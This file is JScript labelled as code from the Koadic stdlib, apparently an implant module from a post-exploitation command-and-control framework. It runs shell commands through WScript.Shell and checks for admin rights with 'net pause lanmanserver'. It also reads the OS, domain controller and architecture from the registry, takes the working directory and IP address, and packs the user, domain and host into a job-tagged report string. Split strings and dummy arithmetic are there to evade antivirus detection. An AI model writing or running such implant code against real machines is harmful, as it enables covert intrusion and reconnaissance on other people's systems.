//Code from Koadic stdlib.js
var FS = new ActiveXObject("Scripting.FileSystemObject");
var WS = new ActiveXObject("WScrip"+"t.Shell");
SHELL_EXEC = function(cmd) {
    e = WS.Exec(cmd);
    f = "";
    while (!e.StdOut.AtEndOfStream) {
        f = e.StdOut.ReadAll();
        }
    return f;
}

isElevated = function()
{
    try
    {
        var res = SHELL_EXEC("net p"+"ause lanman"+"server");
        if (res.indexOf("5") == -1)
            return true;
        else
            return false;
    }
    catch(e)
    {
        return false;
    }
}

OS = function()
{
    try
    {
        // var wmi = GetObject("winmgmts:\\\\.\\root\\CIMV2");
        // var colItems = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem");
        // var enumItems = new Enumerator(colItems);
        // var objItem = enumItems.item();
        var osver = WS.RegRead("HK"+"LM\\SOFTWARE\\Micr"+"osoft\\Windows NT\\CurrentVers"+"ion\\ProductName");
        var osbuild = WS.RegRead("H"+"KLM\\SOFTWARE\\Micros"+"oft\\Windo"+"ws NT\\CurrentVersion\\Curren"+"tBuildNumber");
        return osver+"***"+osbuild;
    }
    catch(e){}

    return "Unkno"+"wn";
}

DC = function()
{
    try
    {
        var DC = WS.RegRead("HKLM\\SOFT"+"WARE\\Microsoft\\Win"+"dows\\CurrentVersion\\Group "+"Policy\\History\\DC"+"Name");
        if (DC.length > 0)
        {
            //DC += "___" + Koadic.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\MachineDomain")
            //DC += ParseDomainAdmins(Koadic.shell.exec("net group \"Domain Admins\" /domain", "%TEMP%\\das.txt"));
            return DC;
        }
    }
    catch(e)
    {
    }
    return "Un"+"known";

}


Arch = function()
{
    try
    {
        // var wmi = GetObject("winmgmts:\\\\.\\root\\CIMV2");
        // var colItems = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem");

        // var enumItems = new Enumerator(colItems);
        // var objItem = enumItems.item();
        var arch = WS.RegRead("HK"+"LM\\SY"+"STEM\\CurrentControlSet\\Contr"+"ol\\Sessi"+"on Manager\\Environment\\PROCESSO"+"R_ARCHITECTURE");
        return arch;
    }
    catch(e){}

    return "Unk"+"nown";
}

CWD = function()
{
    try
    {
        var cwd = SHELL_EXEC("cm"+"d.ex"+"e /c c"+"d");
        return cwd.replace(/^\s+|\s+$/g, '');
    }
    catch(e)
    {}

    return "";
}

IPAddrs = function()
{
    // try
    // {
    //     var ipconfig = Koadic.shell.exec("ipconfig", "%TEMP%\\"+Koadic.uuid()+".txt");
    //     var ip = ipconfig.split("  IPv4 ")[1].split(": ")[1].split("\r\n")[0];
    //     return ip;
    // }
    // catch(e)
    // {
    //     try
    //     {
    //         var ip = ipconfig.split("  IP ")[1].split(": ")[1].split("\r\n")[0];
    //         return ip;
    //     }
    //     // we might need to add more conditions :/
    //     catch(e)
    //     {}
    // }

    try
    {
        var routeprint4 = SHELL_EXEC("route PRINT");
        var res = routeprint4.split("\r\n");
        for (var i=0; i < res.length; i++)
        {
            line = res[i].split(" ");
            // count how many 0.0.0.0 entries in this array
            zerocount = 4-4;
            // count how many entries in this array aren't empty
            itemcount = 9-9;
            // flag for when this is the line we're looking for
            correctflag = false;
            for (var j=0; j < line.length; j++)
            {
                // empty string evals to false
                if (line[j])
                {
                    itemcount += 6-5;
                    // ip addr is in the 4th column
                    if (itemcount == 2+2 && correctflag) {
                        return line[j];
                    }
                }
                if (line[j] == "0."+"0.0.0")
                {
                    zerocount += 9-8;
                    // 2 occurances of the 'any' interface in a single line is what we're looking for
                    if (zerocount == 1+1)
                    {
                        correctflag = true;
                    }
                }
            }
        }
    }
    catch(e)
    {}

    return "";
}
//user.IPAddrs.end
//user.info.start
INFO = function()
{
    var net = new ActiveXObject("WSc"+"ript.Net"+"work");
    var domain = "";
    if (net.UserDomain.length != 0)
    {
        domain = net.UserDomain;
    }
    else
    {
        domain = SHELL_EXEC("echo %us"+"erdomain%");
        domain = domain.split(" \r\n")[0];
    }
    var info = domain + "\\" + net.Username;

    if (isElevated())
        info += "*";

    var bypassio = net.ComputerName;

    info += "/"+"//" + bypassio;
    info += "//"+"/" + OS();
    info += "/"+"//" + DC();
    info += "//"+"/" + Arch();
    info += "/"+"//" + CWD();
    info += "//"+"/" + IPAddrs();

    return info;
}
c = "~JOB_ID~"+"|"+INFO();